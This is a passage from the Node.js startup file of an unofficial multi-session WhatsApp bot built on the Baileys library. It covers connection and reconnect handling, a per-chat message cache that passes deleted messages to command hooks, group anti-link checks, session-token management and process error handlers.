          console.log(`⚠️ Stream conflict detected${this.multiMode ? ` (${this.label})` : ''}. Please unlink other devices or generate a fresh session.`);
        } else {
          console.log(`Connection closed${this.multiMode ? ` (${this.label})` : ''} due to:`, errorMessage, '\nReconnecting:', shouldReconnect);
        }

        if (shouldReconnect) {
          this.scheduleReconnect(String(statusCode || 'close'), 3000);
        } else if (!isConflict) {
          console.log('⚠️ Logged out. Delete session and re-pair / re-login.');
        }
      } else if (connection === 'open') {
        lastActivity = Date.now();
        await this.onOpen(sock);
      }
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('messages.upsert', ({ messages, type }) => {
      if (type !== 'notify') return;
      for (const msg of messages) {
        if (!msg.message || !msg.key?.id) continue;
        const from = msg.key.remoteJid;
        if (!from) continue;
        if (isSystemJid(from)) continue;

        const protocol = msg.message?.protocolMessage;
        const revokeKey = protocol?.key;
        if (revokeKey?.id && (protocol?.type === 0 || protocol?.type === 1 || protocol?.type === undefined)) {
          if (!revokeKey.remoteJid) revokeKey.remoteJid = from;
          const deleter = msg.key?.participant || msg.key?.remoteJid || null;
          for (const command of new Set(handler.commands.values())) {
            if (typeof command.handleDelete === 'function') {
              command.handleDelete(sock, { key: revokeKey, deleter }).catch(() => {});
            }
          }
        }

        const msgId = msg.key.id;
        if (this.processedMessages.has(msgId)) continue;

        const MESSAGE_AGE_LIMIT = from === 'status@broadcast'
          ? 48 * 60 * 60 * 1000
          : 24 * 60 * 60 * 1000;
        if (msg.messageTimestamp) {
          const messageAge = Date.now() - (msg.messageTimestamp * 1000);
          if (messageAge > MESSAGE_AGE_LIMIT) continue;
        }
        this.processedMessages.add(msgId);

        if (msg.key && msg.key.id) {
          if (!this.store.messages.has(from)) this.store.messages.set(from, new Map());
          const chatMsgs = this.store.messages.get(from);
          chatMsgs.set(msg.key.id, msg);
          if (chatMsgs.size > this.store.maxPerChat) {
            const sortedIds = Array.from(chatMsgs.entries())
              .sort((a, b) => (a[1].messageTimestamp || 0) - (b[1].messageTimestamp || 0))
              .map(([id]) => id);
            for (let i = 0; i < sortedIds.length - this.store.maxPerChat; i++) chatMsgs.delete(sortedIds[i]);
          }
        }

        handler.handleMessage(sock, msg).catch(err => {
          if (!err.message?.includes('rate-overlimit') && !err.message?.includes('not-authorized')) {
            console.error('Error handling message:', err.message);
          }
        });

        setImmediate(async () => {
          if (config.autoRead && from.endsWith('@g.us')) {
            try { await sock.readMessages([msg.key]); } catch {}
          }
          if (from.endsWith('@g.us')) {
            try {
              const groupMetadata = await handler.getGroupMetadata(sock, msg.key.remoteJid);
              if (groupMetadata) await handler.handleAntilink(sock, msg, groupMetadata);
            } catch {}
          }
        });
      }
    });

    sock.ev.on('messages.delete', async (deleteData) => {
      try {
        const items = Array.isArray(deleteData) ? deleteData : (deleteData.keys || []);
        for (const key of items) {
          for (const command of new Set(handler.commands.values())) {
            if (typeof command.handleDelete === 'function') {
              await command.handleDelete(sock, { key });
            }
          }
        }
      } catch (error) {
        console.error('Error in delete event:', error);
      }
    });

    sock.ev.on('messages.update', async (updates) => {
      try {
        if (!Array.isArray(updates)) return;
        for (const item of updates) {
          const key = item?.key;
          const update = item?.update;
          const protocol = update?.message?.protocolMessage || update?.protocolMessage;
          const revokeKey = protocol?.key;
          if (!revokeKey?.id) continue;
          if (typeof protocol?.type === 'number' && protocol.type !== 0 && protocol.type !== 1) continue;
          if (!revokeKey.remoteJid && key?.remoteJid) revokeKey.remoteJid = key.remoteJid;
          const deleter = key?.participant || key?.remoteJid || null;
          for (const command of new Set(handler.commands.values())) {
            if (typeof command.handleDelete === 'function') {
              await command.handleDelete(sock, { key: revokeKey, deleter });
            }
          }
        }
      } catch {}
    });

    sock.ev.on('group-participants.update', async (update) => {
      await handler.handleGroupUpdate(sock, update);
    });

    sock.ev.on('error', (error) => {
      if (this.sock !== sock) return;
      const statusCode = error?.output?.statusCode;
      if (statusCode === 515 || statusCode === 503 || statusCode === 408) return;
      console.error('Socket error:', error.message || error);
    });
  }

  async start() {
    if (this.startInProgress) return this.sock;
    this.startInProgress = true;
    try {
      this.disableReconnect = false;
      if (this.reconnectTimer) {
        clearTimeout(this.reconnectTimer);
        this.reconnectTimer = null;
      }

      await this.cleanupSock();

      if (this.sessionId) ensureCredsFromSessionId(this.authDir, this.sessionId);

      if (!acquireAuthLock(this.authDir, this.label)) {
        console.log(`⚠️ Auth already in use${this.multiMode ? ` (${this.label})` : ''}. Stop other bot instance(s) to avoid conflict.`);
        return null;
      }
      this.lockAcquired = true;

      let state, saveCreds, version, suppressedLogger;
      try {
        ({ state, saveCreds } = await useMultiFileAuthState(this.authDir));
        ({ version } = await fetchLatestBaileysVersion());
        suppressedLogger = createSuppressedLogger('silent');
      } catch (e) {
        this.lockAcquired = false;
        releaseAuthLock(this.authDir);
        throw e;
      }

      const sock = makeWASocket({
        version,
        logger: suppressedLogger,
        printQRInTerminal: false,
        browser: ['Chrome', 'Windows', '10.0'],
        auth: state,
        syncFullHistory: false,
        downloadHistory: false,
        markOnlineOnConnect: false,
        getMessage: async () => undefined
      });

      this.sock = sock;
      this.attachHandlers(sock, saveCreds);

      if (this.pairingPhone && !state.creds.registered) {
        try {
          await sleep(2000);
          let code = await sock.requestPairingCode(this.pairingPhone);
          code = code?.match(/.{1,4}/g)?.join('-') || code;
          console.log('\n' + '='.repeat(50));
          console.log(`🔐 Pairing Code${this.multiMode ? ` (${this.label})` : ''}:`, code);
          console.log('Open WhatsApp → Linked devices → Link a device → Enter code');
          console.log('='.repeat(50) + '\n');
        } catch (e) {
          console.error('❌ Failed to request pairing code:', e?.message || e);
        }
      }

      return sock;
    } finally {
      this.startInProgress = false;
    }
  }
}

const sessionManager = (() => {
  const runnersByLabel = new Map();

  const normalizePhone = (input) => String(input || '').replace(/[^0-9]/g, '');

  const listSavedSessions = () => {
    try {
      const idx = readSessionsIndex();
      const saved = (idx.sessions || [])
        .filter(s => s && s.authDir)
        .map(s => ({
          phone: s.phone || null,
          label: s.label || null,
          authDir: s.authDir,
          credsCopy: s.credsCopy || null,
          updatedAt: s.updatedAt || null
        }));
      return saved;
    } catch {
      return [];
    }
  };

  const registerRunner = (runner) => {
    if (!runner || !runner.label) return;
    runnersByLabel.set(runner.label, runner);
  };

  const findRunnerByPhone = (phone) => {
    const needle = normalizePhone(phone);
    if (!needle) return null;
    for (const r of runnersByLabel.values()) {
      if (normalizePhone(r.phone) === needle) return r;
    }
    return null;
  };

  const removeSavedSessionByPhone = (phone) => {
    const needle = normalizePhone(phone);
    if (!needle) return { removed: false };
    const idx = readSessionsIndex();
    const kept = [];
    let removed = null;
    for (const s of idx.sessions || []) {
      const p = normalizePhone(s?.phone);
      if (p && p === needle && !removed) removed = s;
      else kept.push(s);
    }
    idx.sessions = kept;
    writeJsonAtomic(SESSIONS_INDEX_PATH, idx);

    try {
      if (removed?.authDir) {
        const authDir = path.join(__dirname, removed.authDir);
        fs.rmSync(authDir, { recursive: true, force: true });
      }
    } catch {}
    try {
      if (removed?.credsCopy) {
        const copyPath = path.join(__dirname, removed.credsCopy);
        fs.rmSync(copyPath, { force: true });
      }
    } catch {}
    return { removed: !!removed, removedEntry: removed || null };
  };

  return {
    registerRunner,
    getPrimarySock() {
      const single = runnersByLabel.get('single');
      if (single?.sock) return single.sock;
      for (const r of runnersByLabel.values()) {
        if (normalizePhone(r.phone) === normalizePhone(OWNER_NUMBER) && r.sock) return r.sock;
      }
      return null;
    },
    getActiveSocks() {
      const socks = [];
      for (const r of runnersByLabel.values()) {
        if (r?.sock) socks.push(r.sock);
      }
      return socks;
    },
    async connect(sessionIdsInput) {
      const parts = splitSessionIdList(sessionIdsInput);
      const sessionIds = parts.length ? parts : [String(sessionIdsInput || '').trim()].filter(Boolean);
      const clean = sessionIds.filter(x => x && String(x).startsWith('ProBoy-MD!'));
      if (!clean.length) return { ok: false, error: "Invalid session id. Expected 'ProBoy-MD!....'" };

      if (!fs.existsSync(SESSION_MULTI_ROOT)) fs.mkdirSync(SESSION_MULTI_ROOT, { recursive: true });

      const started = [];
      for (const token of clean) {
        const hash = computeSessionTokenHash(token);
        const authDir = path.join(SESSION_MULTI_ROOT, `auth-${hash}`);
        const label = `connect-${hash}`;
        const runner = new SessionRunner({ label, authDir, sessionId: token, pairingPhone: null, multiMode: true });
        registerRunner(runner);
        runner.start().catch(() => {});
        started.push({ label, authDir: path.relative(__dirname, authDir) });
      }
      return { ok: true, started };
    },
    async disconnect(phoneOrLabel) {
      const label = String(phoneOrLabel || '').trim();
      let runner = runnersByLabel.get(label);
      if (!runner) runner = findRunnerByPhone(label);
      if (!runner) return { ok: false, error: 'Session not found' };

      // CRITICAL: Never allow disconnecting the owner's bot session
      if (!runner.multiMode && normalizePhone(runner.phone) === normalizePhone(OWNER_NUMBER)) {
        return { ok: false, error: 'Primary bot session cannot be removed' };
      }

      runner.disableReconnect = true;
      try { await runner.cleanupSock(); } catch {}

      const phone = runner.phone || null;
      runnersByLabel.delete(runner.label);

      if (phone) removeSavedSessionByPhone(phone);
      return { ok: true, label: runner.label, phone };
    },
    status() {
      const active = [];
      for (const r of runnersByLabel.values()) {
        const connected = !!r.isConnected;
        active.push({
          label: r.label,
          phone: r.phone || null,
          connected,
          multi: !!r.multiMode,
          authDir: path.relative(__dirname, r.authDir),
          startedAt: r.startedAt,
          lastConnectedAt: r.lastConnectedAt
        });
      }
      const saved = listSavedSessions();
      return { active, saved, at: Date.now() };
    }
  };
})();

globalThis.ProBoySessionManager = sessionManager;

const resolveStartupAuth = async () => {
  const defaultAuthDir = path.join(__dirname, config.sessionName);
  const configured = String(config.sessionID || '').trim();

  if (configured) {
    try { rl.close(); } catch {}
    const parts = splitSessionIdList(configured);
    if (parts.length > 1) {
      return { mode: 'multi', sessionIds: parts, defaultAuthDir };
    }
    if (parts.length === 1) {
      return { mode: 'single', sessionId: parts[0], authDir: defaultAuthDir, pairingPhone: null };
    }
  }

  if (sessionCredsExists(defaultAuthDir)) {
    try { rl.close(); } catch {}
    return { mode: 'single', sessionId: null, authDir: defaultAuthDir, pairingPhone: null };
  }

  const auth = await getAuthFromUser();
  if (auth.mode === 'pair') return { mode: 'single', sessionId: null, authDir: defaultAuthDir, pairingPhone: auth.phone };
  const list = Array.isArray(auth.sessionIds) ? auth.sessionIds : [];
  if (list.length > 1) return { mode: 'multi', sessionIds: list, defaultAuthDir };
  return { mode: 'single', sessionId: list[0], authDir: defaultAuthDir, pairingPhone: null };
};

async function startAllBots() {
  await maybeAutoUpdateOnBoot();

  const resolved = await resolveStartupAuth();
  const usedAuthDirs = new Set();
  if (resolved.mode === 'single') {
    const runner = new SessionRunner({
      label: 'single',
      authDir: resolved.authDir,
      sessionId: resolved.sessionId,
      pairingPhone: resolved.pairingPhone,
      multiMode: false
    });
    sessionManager.registerRunner(runner);
    await runner.start();
    usedAuthDirs.add(path.resolve(resolved.authDir));
  }

  const runners = [];

  const saved = (() => {
    try { return (readSessionsIndex().sessions || []); } catch { return []; }
  })();
  for (const s of saved) {
    const rel = s?.authDir;
    if (!rel) continue;
    const authDir = path.join(__dirname, rel);
    if (!sessionCredsExists(authDir)) continue;
    const key = path.resolve(authDir);
    if (usedAuthDirs.has(key)) continue;
    usedAuthDirs.add(key);
    const label = s?.label || (s?.phone ? `session-${s.phone}` : `saved-${usedAuthDirs.size}`);
    const runner = new SessionRunner({ label, authDir, sessionId: null, pairingPhone: null, multiMode: true });
    sessionManager.registerRunner(runner);
    runners.push(runner);
  }

  if (resolved.mode === 'multi') {
    if (!fs.existsSync(SESSION_MULTI_ROOT)) fs.mkdirSync(SESSION_MULTI_ROOT, { recursive: true });
    const ids = resolved.sessionIds || [];
    for (let i = 0; i < ids.length; i++) {
      const token = ids[i];
      const hash = computeSessionTokenHash(token);
      const authDir = path.join(SESSION_MULTI_ROOT, `auth-${hash}`);
      const key = path.resolve(authDir);
      if (usedAuthDirs.has(key)) continue;
      usedAuthDirs.add(key);
      const label = `session-${i + 1}`;
      const runner = new SessionRunner({ label, authDir, sessionId: token, pairingPhone: null, multiMode: true });
      sessionManager.registerRunner(runner);
      runners.push(runner);
    }
  }

  if (runners.length) {
    console.log(`🧩 Multi-session mode: starting ${runners.length} WhatsApp connections...`);
    await Promise.all(runners.map(r => r.start().catch(() => null)));
  }
}

// Start the bot
console.log('🚀 Starting WhatsApp MD Bot...\n');
console.log(`📦 Bot Name: ${config.botName}`);
console.log(`⚡ Prefix: ${config.prefix}`);
const ownerNames = Array.isArray(config.ownerName) ? config.ownerName.join(', ') : config.ownerName;
console.log(`👑 Owner: ${ownerNames}\n`);

cleanupPuppeteerCache();

startAllBots().catch(err => {
  console.error('Error starting bot:', err);
  process.exit(1);
});

process.on('uncaughtException', (err) => {
  if (err && (err.code === 'ENOSPC' || err.errno === -28 || (err.message && err.message.includes('no space left on device')))) {
    console.error('⚠️ ENOSPC Error: No space left on device. Attempting cleanup...');
    const { cleanupOldFiles } = require('./utils/cleanup');
    cleanupOldFiles();
    console.warn('⚠️ Cleanup completed. Bot will continue but may experience issues until space is freed.');
    return;
  }
  console.error('Uncaught Exception:', err);
});

process.on('unhandledRejection', (err) => {
  if (err && (err.code === 'ENOSPC' || err.errno === -28 || (err.message && err.message.includes('no space left on device')))) {
    console.warn('⚠️ ENOSPC Error in promise: No space left on device. Attempting cleanup...');
    const { cleanupOldFiles } = require('./utils/cleanup');
    cleanupOldFiles();
    console.warn('⚠️ Cleanup completed. Bot will continue but may experience issues until space is freed.');
    return;
  }
  if (err && (err.code === 'EAI_AGAIN' || err.code === 'ENOTFOUND' || err.code === 'ECONNRESET')) {
    return;
  }
  if (err && err.message && /getaddrinfo\s+eai_again/i.test(err.message)) {
    return;
  }
  if (err && err.message && err.message.includes('rate-overlimit')) {
    console.warn('⚠️ Rate limit reached. Please slow down your requests.');
    return;
  }
  console.error('Unhandled Rejection:', err);
});
